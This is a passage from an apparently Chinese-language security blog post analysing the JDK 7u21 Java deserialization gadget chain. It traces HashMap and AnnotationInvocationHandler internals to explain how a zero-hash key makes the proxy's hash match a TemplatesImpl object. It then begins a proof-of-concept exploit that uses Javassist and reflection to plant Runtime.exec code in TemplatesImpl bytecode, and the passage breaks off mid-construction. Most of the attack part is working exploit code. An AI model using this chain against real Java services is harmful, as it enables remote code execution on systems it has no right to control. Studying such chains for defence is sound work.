</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">table</span><span style="color:#56b6c2">[</span><span style="color:#e06c75">bucketIndex</span><span style="color:#56b6c2">]</span> <span style="color:#56b6c2">=</span> <span style="color:#c678dd">new</span> <span style="color:#e06c75">Entry</span><span style="color:#56b6c2">&lt;&gt;(</span><span style="color:#e06c75">hash</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">key</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">value</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">e</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">size</span><span style="color:#56b6c2">++;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#56b6c2">}</span>
</span></span></code></pre></div><p>很明显，如果想让后续的<code>&lt;key, value&gt;</code>进入for循环，那么key的hash值就必须等于已经put的<code>&lt;e.key, e.value&gt;</code>的hash值，即 hash(key) == hash(e.key)</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>        <span style="color:#c678dd">for</span> <span style="color:#56b6c2">(</span><span style="color:#e06c75">Entry</span><span style="color:#56b6c2">&lt;</span><span style="color:#e06c75">K</span><span style="color:#56b6c2">,</span><span style="color:#e06c75">V</span><span style="color:#56b6c2">&gt;</span> <span style="color:#e06c75">e</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">table</span><span style="color:#56b6c2">[</span><span style="color:#e06c75">i</span><span style="color:#56b6c2">];</span> <span style="color:#e06c75">e</span> <span style="color:#56b6c2">!=</span> <span style="color:#e5c07b">null</span><span style="color:#56b6c2">;</span> <span style="color:#e06c75">e</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">e</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">next</span><span style="color:#56b6c2">)</span> <span style="color:#56b6c2">{</span>
</span></span><span style="display:flex;"><span>            <span style="color:#7f848e">//从i开始, 遍历table[i]往后的元素
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>            <span style="color:#e06c75">Object</span> <span style="color:#e06c75">k</span><span style="color:#56b6c2">;</span>
</span></span><span style="display:flex;"><span>            <span style="color:#c678dd">if</span> <span style="color:#56b6c2">(</span><span style="color:#e06c75">e</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">hash</span> <span style="color:#56b6c2">==</span> <span style="color:#e06c75">hash</span> <span style="color:#56b6c2">&amp;&amp;</span> <span style="color:#56b6c2">((</span><span style="color:#e06c75">k</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">e</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">key</span><span style="color:#56b6c2">)</span> <span style="color:#56b6c2">==</span> <span style="color:#e06c75">key</span> <span style="color:#56b6c2">||</span> <span style="color:#e06c75">key</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">equals</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">k</span><span style="color:#56b6c2">)))</span> <span style="color:#56b6c2">{</span>
</span></span><span style="display:flex;"><span>                <span style="color:#7f848e">//如果e.hash == hash, 并且e.key != key, 就会进入equals方法
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>                <span style="color:#e06c75">V</span> <span style="color:#e06c75">oldValue</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">e</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">value</span><span style="color:#56b6c2">;</span>
</span></span><span style="display:flex;"><span>                <span style="color:#e06c75">e</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">value</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">value</span><span style="color:#56b6c2">;</span>
</span></span><span style="display:flex;"><span>                <span style="color:#e06c75">e</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">recordAccess</span><span style="color:#56b6c2">(</span><span style="color:#c678dd">this</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span>                <span style="color:#c678dd">return</span> <span style="color:#e06c75">oldValue</span><span style="color:#56b6c2">;</span>
</span></span><span style="display:flex;"><span>            <span style="color:#56b6c2">}</span>
</span></span><span style="display:flex;"><span>        <span style="color:#56b6c2">}</span>
</span></span></code></pre></div><p>要执行 proxy.equals(k)，，就得使 hash(proxy) == hash(templates)，且 proxy != templates（否则不会执行 key.equals(k)语句，这是<code>||</code>的特点）</p>
<p>看一下HashMap.hash()方法</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>    <span style="color:#c678dd">final</span> <span style="color:#e5c07b">int</span> <span style="color:#61afef;font-weight:bold">hash</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">Object</span> <span style="color:#e06c75">k</span><span style="color:#56b6c2">)</span> <span style="color:#56b6c2">{</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e5c07b">int</span> <span style="color:#e06c75">h</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">0</span><span style="color:#56b6c2">;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#c678dd">if</span> <span style="color:#56b6c2">(</span><span style="color:#e06c75">useAltHashing</span><span style="color:#56b6c2">)</span> <span style="color:#56b6c2">{</span>
</span></span><span style="display:flex;"><span>            <span style="color:#c678dd">if</span> <span style="color:#56b6c2">(</span><span style="color:#e06c75">k</span> <span style="color:#c678dd">instanceof</span> <span style="color:#e06c75">String</span><span style="color:#56b6c2">)</span> <span style="color:#56b6c2">{</span>
</span></span><span style="display:flex;"><span>                <span style="color:#c678dd">return</span> <span style="color:#e06c75">sun</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">misc</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">Hashing</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">stringHash32</span><span style="color:#56b6c2">((</span><span style="color:#e06c75">String</span><span style="color:#56b6c2">)</span> <span style="color:#e06c75">k</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span>            <span style="color:#56b6c2">}</span>
</span></span><span style="display:flex;"><span>            <span style="color:#e06c75">h</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">hashSeed</span><span style="color:#56b6c2">;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#56b6c2">}</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">h</span> <span style="color:#56b6c2">^=</span> <span style="color:#e06c75">k</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">hashCode</span><span style="color:#56b6c2">();</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#7f848e">// This function ensures that hashCodes that differ only by
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>        <span style="color:#7f848e">// constant multiples at each bit position have a bounded
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>        <span style="color:#7f848e">// number of collisions (approximately 8 at default load factor).
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>        <span style="color:#e06c75">h</span> <span style="color:#56b6c2">^=</span> <span style="color:#56b6c2">(</span><span style="color:#e06c75">h</span> <span style="color:#56b6c2">&gt;&gt;&gt;</span> <span style="color:#d19a66">20</span><span style="color:#56b6c2">)</span> <span style="color:#56b6c2">^</span> <span style="color:#56b6c2">(</span><span style="color:#e06c75">h</span> <span style="color:#56b6c2">&gt;&gt;&gt;</span> <span style="color:#d19a66">12</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#c678dd">return</span> <span style="color:#e06c75">h</span> <span style="color:#56b6c2">^</span> <span style="color:#56b6c2">(</span><span style="color:#e06c75">h</span> <span style="color:#56b6c2">&gt;&gt;&gt;</span> <span style="color:#d19a66">7</span><span style="color:#56b6c2">)</span> <span style="color:#56b6c2">^</span> <span style="color:#56b6c2">(</span><span style="color:#e06c75">h</span> <span style="color:#56b6c2">&gt;&gt;&gt;</span> <span style="color:#d19a66">4</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span>    <span style="color:#56b6c2">}</span>
</span></span></code></pre></div><p>可以看到hash方法内部调用了hashCode()，因此只有 proxy.hashCode() == templates.hashCode() 成立时，才能调用 proxy.equals()</p>
<p>计算 proxy 实例的hash值，会进入 AnnotationInvocationHandler.invoke 方法，我们看一下相关的代码</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#c678dd">public</span> <span style="color:#e06c75">Object</span> <span style="color:#61afef;font-weight:bold">invoke</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">Object</span> <span style="color:#e06c75">proxy</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">Method</span> <span style="color:#e06c75">method</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">Object</span><span style="color:#56b6c2">[]</span> <span style="color:#e06c75">args</span><span style="color:#56b6c2">)</span> <span style="color:#56b6c2">{</span>
</span></span><span style="display:flex;"><span>    <span style="color:#e06c75">String</span> <span style="color:#e06c75">member</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">method</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">getName</span><span style="color:#56b6c2">();</span>
</span></span><span style="display:flex;"><span>    <span style="color:#e06c75">Class</span><span style="color:#56b6c2">&lt;?&gt;[]</span> <span style="color:#e06c75">paramTypes</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">method</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">getParameterTypes</span><span style="color:#56b6c2">();</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#7f848e">// Handle Object and Annotation methods
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>    <span style="color:#c678dd">if</span> <span style="color:#56b6c2">(</span><span style="color:#e06c75">member</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">equals</span><span style="color:#56b6c2">(</span><span style="color:#98c379">&#34;equals&#34;</span><span style="color:#56b6c2">)</span> <span style="color:#56b6c2">&amp;&amp;</span> <span style="color:#e06c75">paramTypes</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">length</span> <span style="color:#56b6c2">==</span> <span style="color:#d19a66">1</span> <span style="color:#56b6c2">&amp;&amp;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">paramTypes</span><span style="color:#56b6c2">[</span><span style="color:#d19a66">0</span><span style="color:#56b6c2">]</span> <span style="color:#56b6c2">==</span> <span style="color:#e06c75">Object</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">class</span><span style="color:#56b6c2">)</span>
</span></span><span style="display:flex;"><span>        <span style="color:#c678dd">return</span> <span style="color:#e06c75">equalsImpl</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">args</span><span style="color:#56b6c2">[</span><span style="color:#d19a66">0</span><span style="color:#56b6c2">]);</span>
</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">assert</span> <span style="color:#e06c75">paramTypes</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">length</span> <span style="color:#56b6c2">==</span> <span style="color:#d19a66">0</span><span style="color:#56b6c2">;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">if</span> <span style="color:#56b6c2">(</span><span style="color:#e06c75">member</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">equals</span><span style="color:#56b6c2">(</span><span style="color:#98c379">&#34;toString&#34;</span><span style="color:#56b6c2">))</span>
</span></span><span style="display:flex;"><span>        <span style="color:#c678dd">return</span> <span style="color:#e06c75">toStringImpl</span><span style="color:#56b6c2">();</span>
</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">if</span> <span style="color:#56b6c2">(</span><span style="color:#e06c75">member</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">equals</span><span style="color:#56b6c2">(</span><span style="color:#98c379">&#34;hashCode&#34;</span><span style="color:#56b6c2">))</span>
</span></span><span style="display:flex;"><span>        <span style="color:#c678dd">return</span> <span style="color:#e06c75">hashCodeImpl</span><span style="color:#56b6c2">();</span>
</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">if</span> <span style="color:#56b6c2">(</span><span style="color:#e06c75">member</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">equals</span><span style="color:#56b6c2">(</span><span style="color:#98c379">&#34;annotationType&#34;</span><span style="color:#56b6c2">))</span>
</span></span><span style="display:flex;"><span>        <span style="color:#c678dd">return</span> <span style="color:#e06c75">type</span><span style="color:#56b6c2">;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#7f848e">// Handle annotation member accessors
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>    <span style="color:#e06c75">Object</span> <span style="color:#e06c75">result</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">memberValues</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">get</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">member</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">if</span> <span style="color:#56b6c2">(</span><span style="color:#e06c75">result</span> <span style="color:#56b6c2">==</span> <span style="color:#e5c07b">null</span><span style="color:#56b6c2">)</span>
</span></span><span style="display:flex;"><span>        <span style="color:#c678dd">throw</span> <span style="color:#c678dd">new</span> <span style="color:#e06c75">IncompleteAnnotationException</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">type</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">member</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">if</span> <span style="color:#56b6c2">(</span><span style="color:#e06c75">result</span> <span style="color:#c678dd">instanceof</span> <span style="color:#e06c75">ExceptionProxy</span><span style="color:#56b6c2">)</span>
</span></span><span style="display:flex;"><span>        <span style="color:#c678dd">throw</span> <span style="color:#56b6c2">((</span><span style="color:#e06c75">ExceptionProxy</span><span style="color:#56b6c2">)</span> <span style="color:#e06c75">result</span><span style="color:#56b6c2">).</span><span style="color:#e06c75">generateException</span><span style="color:#56b6c2">();</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">if</span> <span style="color:#56b6c2">(</span><span style="color:#e06c75">result</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">getClass</span><span style="color:#56b6c2">().</span><span style="color:#e06c75">isArray</span><span style="color:#56b6c2">()</span> <span style="color:#56b6c2">&amp;&amp;</span> <span style="color:#e06c75">Array</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">getLength</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">result</span><span style="color:#56b6c2">)</span> <span style="color:#56b6c2">!=</span> <span style="color:#d19a66">0</span><span style="color:#56b6c2">)</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">result</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">cloneArray</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">result</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">return</span> <span style="color:#e06c75">result</span><span style="color:#56b6c2">;</span>
</span></span><span style="display:flex;"><span><span style="color:#56b6c2">}</span>
</span></span></code></pre></div><p>这里会进入到 hashCodeImpl 方法</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>    <span style="color:#c678dd">private</span> <span style="color:#e5c07b">int</span> <span style="color:#61afef;font-weight:bold">hashCodeImpl</span><span style="color:#56b6c2">()</span> <span style="color:#56b6c2">{</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e5c07b">int</span> <span style="color:#e06c75">result</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">0</span><span style="color:#56b6c2">;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#c678dd">for</span> <span style="color:#56b6c2">(</span><span style="color:#e06c75">Map</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">Entry</span><span style="color:#56b6c2">&lt;</span><span style="color:#e06c75">String</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">Object</span><span style="color:#56b6c2">&gt;</span> <span style="color:#e06c75">e</span> <span style="color:#56b6c2">:</span> <span style="color:#e06c75">memberValues</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">entrySet</span><span style="color:#56b6c2">())</span> <span style="color:#56b6c2">{</span>
</span></span><span style="display:flex;"><span>            <span style="color:#e06c75">result</span> <span style="color:#56b6c2">+=</span> <span style="color:#56b6c2">(</span><span style="color:#d19a66">127</span> <span style="color:#56b6c2">*</span> <span style="color:#e06c75">e</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">getKey</span><span style="color:#56b6c2">().</span><span style="color:#e06c75">hashCode</span><span style="color:#56b6c2">())</span> <span style="color:#56b6c2">^</span> <span style="color:#e06c75">memberValueHashCode</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">e</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">getValue</span><span style="color:#56b6c2">());</span>
</span></span><span style="display:flex;"><span>        <span style="color:#56b6c2">}</span>
</span></span><span style="display:flex;"><span>        <span style="color:#c678dd">return</span> <span style="color:#e06c75">result</span><span style="color:#56b6c2">;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#56b6c2">}</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">private</span> <span style="color:#c678dd">static</span> <span style="color:#e5c07b">int</span> <span style="color:#61afef;font-weight:bold">memberValueHashCode</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">Object</span> <span style="color:#e06c75">value</span><span style="color:#56b6c2">)</span> <span style="color:#56b6c2">{</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">Class</span><span style="color:#56b6c2">&lt;?&gt;</span> <span style="color:#e06c75">type</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">value</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">getClass</span><span style="color:#56b6c2">();</span>
</span></span><span style="display:flex;"><span>        <span style="color:#c678dd">if</span> <span style="color:#56b6c2">(!</span><span style="color:#e06c75">type</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">isArray</span><span style="color:#56b6c2">())</span>    <span style="color:#7f848e">// primitive, string, class, enum const,
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>                                <span style="color:#7f848e">// or annotation
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>            <span style="color:#c678dd">return</span> <span style="color:#e06c75">value</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">hashCode</span><span style="color:#56b6c2">();</span>
</span></span><span style="display:flex;"><span>        <span style="color:#56b6c2">...</span>
</span></span><span style="display:flex;"><span>    <span style="color:#56b6c2">}</span>
</span></span></code></pre></div><p>可以发现这里涉及到一个异或的操作，异或操作有一个特性，<code>0 ^ n == n</code>（当时没注意到这里，感谢<a class="link" href="https://xz.aliyun.com/t/6884"  target="_blank" rel="noopener"
    ><strong>啦啦0咯咯</strong></a>师傅的启发(づ￣ 3￣)づ），如果 e.getKey().hashCode() == 0，就会变成 result += (e.getValue()).hashCode()。因此，如果 memberValues == new HashMap(&quot;&quot;, templatesImpl)，hashCodeImpl()的结果就变成了templates.hashCode() ，proxy.hashCode()就等于tempatesImpl.hashCode()</p>
<p>沿着这条思路，构造一下POC</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#c678dd">public</span> <span style="color:#c678dd">class</span> <span style="color:#e5c07b">jdk7u21Chain</span> <span style="color:#56b6c2">{</span>
</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">public</span> <span style="color:#c678dd">static</span> <span style="color:#c678dd">class</span> <span style="color:#e5c07b">test</span><span style="color:#56b6c2">{</span>
</span></span><span style="display:flex;"><span>    <span style="color:#56b6c2">}</span>
</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">public</span> <span style="color:#c678dd">static</span> <span style="color:#e5c07b">void</span> <span style="color:#61afef;font-weight:bold">main</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">String</span><span style="color:#56b6c2">[]</span> <span style="color:#e06c75">args</span><span style="color:#56b6c2">)</span> <span style="color:#c678dd">throws</span> <span style="color:#e06c75">NoSuchFieldException</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">IOException</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">IllegalAccessException</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">NotFoundException</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">CannotCompileException</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">ClassNotFoundException</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">NoSuchMethodException</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">InvocationTargetException</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">InstantiationException</span> <span style="color:#56b6c2">{</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">ClassPool</span> <span style="color:#e06c75">pool</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">ClassPool</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">getDefault</span><span style="color:#56b6c2">();</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">CtClass</span> <span style="color:#e06c75">cc</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">pool</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">get</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">test</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">class</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">getName</span><span style="color:#56b6c2">());</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">String</span> <span style="color:#e06c75">cmd</span> <span style="color:#56b6c2">=</span> <span style="color:#98c379">&#34;java.lang.Runtime.getRuntime().exec(\&#34;calc\&#34;);&#34;</span><span style="color:#56b6c2">;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">cc</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">makeClassInitializer</span><span style="color:#56b6c2">().</span><span style="color:#e06c75">insertBefore</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">cmd</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">cc</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">setSuperclass</span><span style="color:#56b6c2">((</span><span style="color:#e06c75">pool</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">get</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">AbstractTranslet</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">class</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">getName</span><span style="color:#56b6c2">())));</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">TemplatesImpl</span> <span style="color:#e06c75">templatesImpl</span> <span style="color:#56b6c2">=</span> <span style="color:#c678dd">new</span> <span style="color:#e06c75">TemplatesImpl</span><span style="color:#56b6c2">();</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">Class</span> <span style="color:#e06c75">tc</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">templatesImpl</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">getClass</span><span style="color:#56b6c2">();</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">Field</span> <span style="color:#e06c75">nameField</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">tc</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">getDeclaredField</span><span style="color:#56b6c2">(</span><span style="color:#98c379">&#34;_name&#34;</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">nameField</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">setAccessible</span><span style="color:#56b6c2">(</span><span style="color:#e5c07b">true</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">nameField</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">set</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">templatesImpl</span><span style="color:#56b6c2">,</span><span style="color:#98c379">&#34;a&#34;</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#7f848e">//由于getTransletInstance中_name=null会retrun null，所以利用反射，将_name赋值
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">Field</span> <span style="color:#e06c75">bytecodesField</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">tc</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">getDeclaredField</span><span style="color:#56b6c2">(</span><span style="color:#98c379">&#34;_bytecodes&#34;</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">bytecodesField</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">setAccessible</span><span style="color:#56b6c2">(</span><span style="color:#e5c07b">true</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e5c07b">byte</span><span style="color:#56b6c2">[]</span> <span style="color:#e06c75">codes</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">cc</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">toBytecode</span><span style="color:#56b6c2">();</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e5c07b">byte</span><span style="color:#56b6c2">[][]</span> <span style="color:#e06c75">bytes</span> <span style="color:#56b6c2">=</span> <span style="color:#c678dd">new</span> <span style="color:#e5c07b">byte</span><span style="color:#56b6c2">[][]{</span><span style="color:#e06c75">codes</span><span style="color:#56b6c2">};</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">bytecodesField</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">set</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">templatesImpl</span><span style="color:#56b6c2">,</span><span style="color:#e06c75">bytes</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#7f848e">//同理defineTransletClasses中_bytecodes == null会抛出异常，所以将其赋值
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">Field</span> <span style="color:#e06c75">tfactoryField</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">tc</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">getDeclaredField</span><span style="color:#56b6c2">(</span><span style="color:#98c379">&#34;_tfactory&#34;</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">tfactoryField</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">setAccessible</span><span style="color:#56b6c2">(</span><span style="color:#e5c07b">true</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">tfactoryField</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">set</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">templatesImpl</span><span style="color:#56b6c2">,</span><span style="color:#c678dd">new</span> <span style="color:#e06c75">TransformerFactoryImpl</span><span style="color:#56b6c2">());</span>
</span></span><span style="display:flex;"><span>        <span style="color:#7f848e">//本意是为了在defineTransletClasses中，避免_tfactory值为null，导致_tfactory.getExternalExtensionsMap()错误
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>        <span style="color:#7f848e">//但实际上并不影响代码执行
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>        <span style="color:#e06c75">Class</span><span style="color:#56b6c2">&lt;?&gt;</span> <span style="color:#e06c75">aClass</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">Class</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">forName</span><span style="color:#56b6c2">(</span><span style="color:#98c379">&#34;sun.reflect.annotation.AnnotationInvocationHandler&#34;</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">Constructor</span><span style="color:#56b6c2">&lt;?&gt;</span> <span style="color:#e06c75">annotationHandlerInvocationHandlerConstructor</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">aClass</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">getDeclaredConstructor</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">Class</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">class</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">Map</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">class</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">annotationHandlerInvocationHandlerConstructor</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">setAccessible</span><span style="color:#56b6c2">(</span><span style="color:#e5c07b">true</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span>
